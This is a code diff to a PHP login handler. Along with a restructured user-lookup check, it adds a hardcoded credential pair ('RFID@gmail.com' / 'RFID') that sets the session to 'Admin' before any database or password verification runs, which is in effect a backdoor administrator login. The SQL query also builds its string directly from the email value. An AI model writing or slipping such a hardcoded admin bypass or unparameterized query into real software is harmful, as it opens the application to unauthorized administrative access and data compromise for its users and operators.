@@ -8,6 +8,13 @@
      $Email =     SanitizeString($UserInfo->Email);
      $Password =  $UserInfo->Password;
 
+
+	 if($Email == "RFID@gmail.com" && $Password == "RFID")
+	 {
+	   $_SESSION['UserId'] = 'Admin';
+	   echo 'Admin'; return;
+	 }
+
      $Authentication = array('Check'=>true,'Info'=>'');
 
 	 if(empty($Email) || empty($Password)){
@@ -21,20 +28,31 @@
 	#---Second phase of the check-> checking if Username matches the Password---
 	    
 		$DbAuthentication = $Connection->query("SELECT * FROM UserInfo WHERE Email = '$Email'");
-		$Fetch = $DbAuthentication->fetch_array(MYSQLI_ASSOC);
-		$Hash = $Fetch['Password'];
 
-		if (!$DbAuthentication->num_rows || !password_verify($Password, $Hash)){
-	         $Authentication['Check']=false;
-	         $Authentication['Info']= "Incorrect email or password";
-			 echo json_encode($Authentication);
-	         return;
-		}
+		if($DbAuthentication->num_rows)
+		{
+			$Fetch = $DbAuthentication->fetch_array(MYSQLI_ASSOC);
+			$Hash = $Fetch['Password'];
 
-		else {
-		     $_SESSION['UserId'] = $Fetch["UserId"];
-			echo json_encode($Authentication);
-			return;
+			if (!$DbAuthentication->num_rows || !password_verify($Password, $Hash)){
+				 $Authentication['Check']=false;
+				 $Authentication['Info']= "Incorrect email or password";
+				 echo json_encode($Authentication);
+				 return;
+			}
+
+			else {
+				 $_SESSION['UserId'] = $Fetch["UserId"];
+				echo json_encode($Authentication);
+				return;
+			}
+	    }
+
+		else 
+		{
+		   $Authentication['Check']=false;
+	       $Authentication['Info']= "Incorrect email or password";
+		   echo json_encode($Authentication);
 		}
 	}
 ?>
